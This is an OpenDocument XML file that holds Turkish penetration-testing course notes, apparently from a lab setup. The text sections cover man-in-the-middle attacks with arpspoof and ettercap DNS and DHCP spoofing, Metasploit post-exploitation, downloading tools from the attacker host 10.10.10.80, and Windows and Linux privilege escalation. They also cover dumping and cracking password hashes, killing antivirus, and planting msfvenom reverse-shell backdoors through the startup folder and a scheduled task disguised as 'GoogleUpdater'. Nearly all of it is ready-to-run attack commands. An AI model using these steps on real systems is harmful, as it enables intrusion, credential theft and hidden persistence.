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1c490a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fa673" officeooo:paragraph-rsid="001fa673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2cff6a" officeooo:paragraph-rsid="001c490a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204f2d" officeooo:paragraph-rsid="00204f2d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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001fa673" officeooo:paragraph-rsid="001fa673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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001fa673" officeooo:paragraph-rsid="001fa673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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00204f2d" officeooo:paragraph-rsid="00204f2d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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001fa673" officeooo:paragraph-rsid="001fa673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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00204f2d" officeooo:paragraph-rsid="00204f2d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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00417afd" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00409163" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004555e6" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004a8199" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0048cd34" officeooo:paragraph-rsid="00204f2d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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004b28b6" officeooo:paragraph-rsid="00204f2d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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004c2f25" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004c5574" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00511962" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0052e19e" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0054aa85" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0056ff0b" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00579ba0" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005a889c" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005bc3e3" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="005be0f4" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="00409163" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="00417afd" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0042c810" officeooo:paragraph-rsid="001fa673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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="004555e6" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="001fa673" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0047577c" officeooo:paragraph-rsid="001fa673" style:font-size-asian="8.75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style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002cff6a" officeooo:paragraph-rsid="001fa673" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0031c13c" officeooo:paragraph-rsid="001fa673" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001fa673" officeooo:paragraph-rsid="001fa673" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00356991" officeooo:paragraph-rsid="001fa673" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0036e19b" officeooo:paragraph-rsid="001fa673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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0039f8c1" officeooo:paragraph-rsid="001fa673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00" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003be935" officeooo:paragraph-rsid="001fa673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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003ce993" officeooo:paragraph-rsid="001fa673" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001d27fe" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004c2f25" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00511962" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00531d31" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0054aa85" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00550d5f" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00594b33" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="005bc3e3" officeooo:paragraph-rsid="00204f2d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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ee919" officeooo:paragraph-rsid="001fa673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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="11pt" fo:font-weight="bold" officeooo:rsid="004e418a" officeooo:paragraph-rsid="00204f2d" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0042c810" officeooo:paragraph-rsid="001fa673" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00436a91" officeooo:paragraph-rsid="001fa673" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001fa673"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" officeooo:rsid="004b28b6" style:font-size-asian="8.75pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="004555e6"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Liberation Mono" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="00204f2d"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="004a8199"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="0048cd34"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="004b28b6"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="004c5574"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="005bc3e3"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="005a889c"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="005be0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6. MAN IN THE MIDDLE SALDIRILARI</text:p>
      <text:p text:style-name="P2">Yapacağımız işlemleri wiresharktan takip edeceğiz.</text:p>
      <text:p text:style-name="P34">tshark -i eth0 -f "host 1.1.1.1" <text:s/><text:span text:style-name="T1">(tshark da olabilir)</text:span></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34">ip.addr==10.10.10.11 <text:s/>ip.dst==10.10.10.11 <text:s/>ip.src==10.10.10.11</text:p>
      <text:p text:style-name="P34">tcp.port==80 <text:s/><text:span text:style-name="T1">t</text:span>cp.dstport==80</text:p>
      <text:p text:style-name="P34">ip.host==server05 <text:s text:c="2"/><text:span text:style-name="T1">(hostname)</text:span></text:p>
      <text:p text:style-name="P34">eth.addr==00:70:f4:23:18:c4 <text:s/><text:span text:style-name="T1">(mac adresine göre)</text:span></text:p>
      <text:p text:style-name="P34">eth.dst==ff:ff:ff:ff:ff:ff <text:s text:c="2"/><text:span text:style-name="T1">(broadcast paketlerini filtreler)</text:span></text:p>
      <text:p text:style-name="P34">http.request.method==GET <text:s/>http.request.method==POST</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P35">arp-scan -l <text:s/><text:span text:style-name="T1">(detaylı local ip tarama)</text:span></text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P7">Arp poisoning</text:p>
      <text:p text:style-name="P35">arpspoof -i eth0 10.10.10.12</text:p>
      <text:p text:style-name="P35">arpspoof -i eth0 -t 10.10.10.11 10.10.10.254</text:p>
      <text:p text:style-name="P36">(tek yönlü)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P37">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</text:p>
      <text:p text:style-name="P37">arpspoof -i eth0 -t 10.10.10.11 -r 10.10.10.12</text:p>
      <text:p text:style-name="P36">(karşılıklı)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P38"><text:span text:style-name="T1">1-</text:span>arp-scan -l</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T1">2-</text:span>wireshark açtık.</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T1">3-</text:span>echo 1 &gt; /proc/sys/net/ipvt/ip_forward</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T1">4-</text:span>arpspoof -i eth0 -t 10.10.10.11 -r 10.10.10.1</text:p>
      <text:p text:style-name="P39">wireshark üzerinde</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T1">5-</text:span>ip.src==10.10.10.11 and ip.dst==10.10.10.1 and http </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P40">ettercap te önce hostları bulduk sonra 11 ve 254 ü hedef olarak belirledik</text:p>
      <text:p text:style-name="P40">arp poisoning ve dns_sniff plugin i yaptık.</text:p>
      <text:p text:style-name="P40">nano /etc/ettercap/etter.dns <text:s/>(buradan, www.google.com ve www.test.com a giden A adreslerini ayarladık)</text:p>
      <text:p text:style-name="P40">en son apache2 yi çalıştırarak kendimize yönlendirdik</text:p>
      <text:p text:style-name="P35">service apache2 start</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P41">ettercap te DHCP Spoofing i açtık.</text:p>
      <text:p text:style-name="P41">IP pool una rastgele kullanılmayan ip aralığı verdik.</text:p>
      <text:p text:style-name="P41">Netmask ımız 255.255.255.0</text:p>
      <text:p text:style-name="P41">DNS IP ye ise kendimizi yazıp DNS gibi gösteriyoruz 10.10.10.80</text:p>
      <text:p text:style-name="P41">Hedefin DHCP sini biz sağlamış oluyoruz..</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">7. POST EXPLOTATION</text:p>
      <text:p text:style-name="P52">Windows ta Local Exploit Tespiti</text:p>
      <text:p text:style-name="P28">msfconsole dan</text:p>
      <text:p text:style-name="P28">search desktop central yapıp.</text:p>
      <text:p text:style-name="P28">connectionid_write <text:s/>exploitini ayarlıyoruz.</text:p>
      <text:p text:style-name="P28">Payloadımızı <text:s/>windows/x64/meterpreter/reverse_tcp <text:s/>yapıyoruz.</text:p>
      <text:p text:style-name="P29">Meterpreter dayız</text:p>
      <text:p text:style-name="P29">shell</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T4">cd </text:span><text:a xlink:type="simple" xlink:href="../../../../c://" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">c://</text:span></text:a></text:p>
      <text:p text:style-name="P29">systeminfo (çıkan bilgi çok kıymetli ve bunu vagrant.txt olarak kaydediyoruz.)</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">./wes.py /root/Desktop/vagrant.txt</text:p>
      <text:p text:style-name="P29">sistem açıklarını (CVE) <text:s/>buluyoruz.</text:p>
      <text:p text:style-name="P54"><text:soft-page-break/>LINUX ta Local (Kernel) Exploit Tespiti</text:p>
      <text:p text:style-name="P30">msfconsole da trans2open aradık</text:p>
      <text:p text:style-name="P30">rhosts ve payload linux/x86/shell ayarladık</text:p>
      <text:p text:style-name="P30">shell e girince uname -a <text:s/>yazıp kernel bilgisini aldık</text:p>
      <text:p text:style-name="P30">./linux-exploit-suggester-2.pl -k 2.4.7 <text:s/>(kernel bilgisinden CVE bulduk.)</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P55">LINUX a Dosya Çekerek Kernel Exploit Tespiti</text:p>
      <text:p text:style-name="P31">python -m http.server <text:s/>(şuan http serverız)</text:p>
      <text:p text:style-name="P31">girdiğimiz shell de </text:p>
      <text:p text:style-name="P31">cd /tmp</text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T4">wget </text:span><text:a xlink:type="simple" xlink:href="http://10.10.10.80:8000/linux-exploit-suggester-2.pl" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">http://10.10.10.80:8000/linux-exploit-suggester-2.pl</text:span></text:a><text:span text:style-name="T4"> <text:s text:c="2"/>(taşıdık)</text:span></text:p>
      <text:p text:style-name="P31">chmod +x linux-exploit-suggester-2.pl <text:s text:c="5"/>(çalışma yetkisi verdik)</text:p>
      <text:p text:style-name="P31">./linux-exploit-suggester-2.pl <text:s text:c="2"/>(hedefte çalıştırdık)</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P32">Metasploitte <text:span text:style-name="T3">exploit_suggester </text:span>ile sessionda exloit tespiti yapılabilir.</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P33">python -m http.server</text:p>
      <text:p text:style-name="P33">Sessions 1</text:p>
      <text:p text:style-name="P33">shell</text:p>
      <text:p text:style-name="P33">powershell.exe -command IWR -Uri http://10.10.10.80:8000/winPEASx64.exe -OutFile %temp%\winPEASx64.exe</text:p>
      <text:p text:style-name="P33">cd %temp%</text:p>
      <text:p text:style-name="P30">winpeasx64.exe</text:p>
      <text:p text:style-name="P33">windows için local enum..</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">sessions 2</text:p>
      <text:p text:style-name="P33">wget http://10.10.10.80:8000/linpeas.sh</text:p>
      <text:p text:style-name="P33">chmod +x linpeas.sh</text:p>
      <text:p text:style-name="P33">./linpeas.sh</text:p>
      <text:p text:style-name="P33">linux için local enum..</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10">8. PRIVELEGE ESCALATION SALDIRILARI</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Windowsta Yetki Yükseltme</text:p>
      <text:p text:style-name="P15">Getuid <text:span text:style-name="T6">(NT AUTHORITY\LOCAL SERVICE)</text:span> , getprivs, shell, whoami /priv, whoami /all</text:p>
      <text:p text:style-name="P15">ps de otoriteleri görüyoruz.</text:p>
      <text:p text:style-name="P15">list_tokens -u list_tokens -g</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">search windows kernel could</text:p>
      <text:p text:style-name="P14">session belirtip run ediyoruz.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P43">Windows ta <text:span text:style-name="T7">Yetki Yükseltme <text:s/>(manuel)</text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P16">getuid <text:span text:style-name="T6">(NT AUTHORITY\LOCAL SERVICE)</text:span></text:p>
      <text:p text:style-name="P16">cd %temp%</text:p>
      <text:p text:style-name="P16">upload /root/Desktop/rottenpotato.exe</text:p>
      <text:p text:style-name="P16">shell</text:p>
      <text:p text:style-name="P16">rottenpotato.exe <text:s/>(DCOM connection terminated <text:s/>bunu alınca ctrl+C çekiyoruz)</text:p>
      <text:p text:style-name="P16">load incognito</text:p>
      <text:p text:style-name="P16">list_tokens -u</text:p>
      <text:p text:style-name="P16">impersonate_token "NT AUTHORITY\SYSTEM"</text:p>
      <text:p text:style-name="P16">getuid <text:s/>(NT AUTHORITY\SYSTEM)</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"><text:span text:style-name="T7">Linux</text:span> ta <text:span text:style-name="T7">Yetki Yükseltme <text:s/>(manuel)</text:span></text:p>
      <text:p text:style-name="P12">./mod_ssl_exploit 0x6b 10.10.10.12 -c 40</text:p>
      <text:p text:style-name="P12">whoami, <text:span text:style-name="T8">id <text:s/>ile sorduk ama root değiliz.. <text:s/>uname -r</text:span></text:p>
      <text:p text:style-name="P16">python -m http.server</text:p>
      <text:p text:style-name="P16">wget <text:a xlink:type="simple" xlink:href="http://10.10.10.80:8000/3.c" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.80:8000/3.c</text:a> ,, gcc 3.c -o 3 ,, ./3</text:p>
      <text:p text:style-name="P44"><text:soft-page-break/>Linux Hash Dump ve Crack</text:p>
      <text:p text:style-name="P17">dosya alacağımız için http.server olduk.</text:p>
      <text:p text:style-name="P17">cat /etc/passwd <text:s text:c="2"/>(şifreleri verdi.)</text:p>
      <text:p text:style-name="P17">cat /etc/shadow <text:s text:c="2"/>(hashleri verdi.)</text:p>
      <text:p text:style-name="P17">hashleri kopyalayıp txt yaptık.</text:p>
      <text:p text:style-name="P17">hashcat -m 500 -a 0 -o linux-pass.txt shadow.txt /root/Desktop/wordlist_files/pass.txt --status --force</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P44"><text:span text:style-name="T9">Windows</text:span> Hash Dump ve Crack</text:p>
      <text:p text:style-name="P18">use exploit/windows/local/ms18_8120_win32k_privesc</text:p>
      <text:p text:style-name="P18">run post/windows/gather/smart_hashdump <text:s text:c="2"/>(hash leri aldık)</text:p>
      <text:p text:style-name="P18">cd %temp% <text:s/></text:p>
      <text:p text:style-name="P18">upload /root/Desktop/pwdump8.exe</text:p>
      <text:p text:style-name="P18">execute -f pwdump8.exe -i</text:p>
      <text:p text:style-name="P53">crack</text:p>
      <text:p text:style-name="P18">john win-hashes.txt --format=NT</text:p>
      <text:p text:style-name="P19">john win-hashes.txt --format=NT --wordlist wordlist_files/pass.txt</text:p>
      <text:p text:style-name="P18">john win-hashes.txt --format=NT –show</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P45">Migration İşlemi</text:p>
      <text:p text:style-name="P20">ps explorer <text:s text:c="8"/>(explorer, migrate edilebilecek bir yerdir.)</text:p>
      <text:p text:style-name="P20">ps vmtoolsd.exe <text:s text:c="4"/>(bit sayısı uyuyor) (user ı daha güçlü olanı seçeceğiz)</text:p>
      <text:p text:style-name="P20">migrate 2360 <text:s text:c="7"/>(ve migrate ettik.)</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P46">Meterpreter scriptleri ve Şifrelerin Elde Edilmesi</text:p>
      <text:p text:style-name="P21">run get_local_subnets</text:p>
      <text:p text:style-name="P21">run post/windows/gather/checkvm</text:p>
      <text:p text:style-name="P21">run getcountermeasure </text:p>
      <text:p text:style-name="P21">run post/windows/manage/killav</text:p>
      <text:p text:style-name="P21">run post/windows/manage/enable_rdp</text:p>
      <text:p text:style-name="P21">run gettelnet</text:p>
      <text:p text:style-name="P21">run hostsedit</text:p>
      <text:p text:style-name="P21">run winenum </text:p>
      <text:p text:style-name="P21">run scraper </text:p>
      <text:p text:style-name="P21">getpid</text:p>
      <text:p text:style-name="P21">load kiwi</text:p>
      <text:p text:style-name="P21">creds_all</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10">9. ADVANCED PERSISTENT THREAT</text:p>
      <text:p text:style-name="P47">Manuel Payloadlar Oluşturma <text:s/>(Backdoor)</text:p>
      <text:p text:style-name="P22">python -m http.server</text:p>
      <text:p text:style-name="P22">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; rev-shell.exe </text:p>
      <text:p text:style-name="P22">karşıda manuel çalıştırdık</text:p>
      <text:p text:style-name="P22">metasploitten multi handler ı bulup ayarlıyoruz <text:s/></text:p>
      <text:p text:style-name="P22">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P22">set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P22">run</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P48">Backdoor u Sistem Açılışına Yerleştirmek</text:p>
      <text:p text:style-name="P12">msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; rev-cmd-shell.exe</text:p>
      <text:p text:style-name="P12">cd "c:\programdata\microsoft\windows\start menu\programs\startup"</text:p>
      <text:p text:style-name="P12">upload /root/Desktop/rev-cmd-shell.exe</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P48"><text:soft-page-break/>Backdoor u Task Manager a Yerleştirmek</text:p>
      <text:p text:style-name="P22">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.80 lport=4444 -f exe &gt; GoogleUpdater.exe <text:s text:c="3"/><text:span text:style-name="T5">(kendimizi gizlemek için google updater ismini aldık.)</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">cd "<text:a xlink:type="simple" xlink:href="../../../../c:/perflogs" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\perflogs</text:a>"</text:p>
      <text:p text:style-name="P22">upload /root/Desktop/GoogleUpdater.exe</text:p>
      <text:p text:style-name="P22">shell</text:p>
      <text:p text:style-name="P22">schtasks /create /tn GoogleUpdater /tr "C:\PerfLogs\GoogleUpdater.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop" /sc onstart /ru System</text:p>
      <text:p text:style-name="P22"/>
